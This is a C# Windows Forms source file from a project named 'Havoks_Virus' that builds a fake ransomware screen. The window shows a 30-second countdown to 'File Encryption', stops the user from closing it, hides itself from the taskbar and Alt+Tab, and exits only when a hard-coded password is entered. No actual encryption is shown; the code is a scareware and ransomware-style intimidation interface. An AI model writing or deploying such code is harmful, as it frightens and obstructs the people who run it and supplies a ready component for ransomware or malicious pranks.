using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;

namespace Havoks_Virus
{
    public partial class HiddenConsole : Form
    {
        private TextBox consoleOutput;
        private TextBox userInput;

        public HiddenConsole()
        {
            InitializeComponent();
            InitializeConsoleComponents();
            StartCountdown(30); // Start the countdown when the form is created
        }

        private void InitializeConsoleComponents()
        {
            // Configure the form to mimic a console window
            this.FormBorderStyle = FormBorderStyle.FixedDialog; // No resizing
            this.MinimizeBox = false; // No minimize box
            this.MaximizeBox = false; // No maximize box
            this.StartPosition = FormStartPosition.CenterScreen; // Start in screen center
            this.Size = new Size(800, 500); // Set a size for the window
            this.BackColor = Color.Black; // Black background for console feel
            this.Visible = true; // Ensure it's visible

            // Initialize and configure the console output textbox (to mimic console output area)
            consoleOutput = new TextBox
            {
                Multiline = true,
                ScrollBars = ScrollBars.Vertical,
                ReadOnly = true,
                BackColor = Color.Black,
                ForeColor = Color.White,
                Font = new Font("Consolas", 10),
                Dock = DockStyle.Fill, // Take up the entire form                
            };

            // Initialize and configure the user input textbox (to mimic console input line)
            userInput = new TextBox
            {
                Dock = DockStyle.Bottom,
                BackColor = Color.Black,
                ForeColor = Color.White,
                Font = new Font("Consolas", 10),                
            };

            Panel userInputPanel = new Panel
            {
                Dock = DockStyle.Bottom, // Dock to the bottom of the form
                Height = 150, // Set a fixed height
                BackColor = Color.Black // Match the console's color scheme
            };
            userInputPanel.Controls.Add(userInput); // Add the userInput TextBox to the panel
            this.Controls.Add(consoleOutput); // Add the console output first so it's behind the panel
            this.Controls.Add(userInputPanel); // Then add the panel (which includes userInput)

            userInput.KeyPress += userInput_KeyPress; // Event handler for input

            // Add controls to the form
            this.Controls.Add(consoleOutput);
            this.Controls.Add(userInput);

            // Hide the form from taskbar and Alt+Tab
            this.ShowInTaskbar = false;
        }

        private void StartCountdown(int seconds)
        {
            Task.Run(async () => // Use Task.Run to allow the countdown to run asynchronously
            {
                for (int i = seconds; i >= 0; i--)
                {
                    this.Invoke(new Action(() =>
                    {
                        // Update title and console output with countdown
                        this.Text = $"{i} seconds... Until File Encryption";
                        consoleOutput.Text = $"{i} seconds... Until File Encryption\n" + consoleOutput.Text;
                    }));
                    await Task.Delay(1000); // Wait for one second
                }

                // After countdown, change text to indicate encryption started
                this.Invoke(new Action(() =>
                {
                    consoleOutput.Text = "File Encryption Started!\n" + consoleOutput.Text;
                }));
            });
        }

        private void userInput_KeyPress(object sender, KeyPressEventArgs e)
        {
            // Check for Enter key press to evaluate commands or shutdown password
            if (e.KeyChar == (char)Keys.Return)
            {
                var input = userInput.Text.Trim();
                // Check for a shutdown command or password
                if (input == "shutdownPassword") // Replace with your actual shutdown command or password
                {
                    Application.Exit();
                }
                else
                {
                    consoleOutput.AppendText("Invalid command or password.\n");
                }
                userInput.Clear(); // Clear the input for the next command
                e.Handled = true; // Suppress the beep sound
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            if (e.CloseReason == CloseReason.UserClosing)
            {
                // Show custom warning message if the user tries to close the form
                MessageBox.Show("You do not want to do that Pepe.", "Warning!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                MessageBox.Show("Are you Sure!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                e.Cancel = true; // Prevent the form from closing
            }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                // Override the window's parameters to hide it from Alt+Tab and the taskbar
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;  // WS_EX_TOOLWINDOW
                return cp;
            }
        }
    }
}
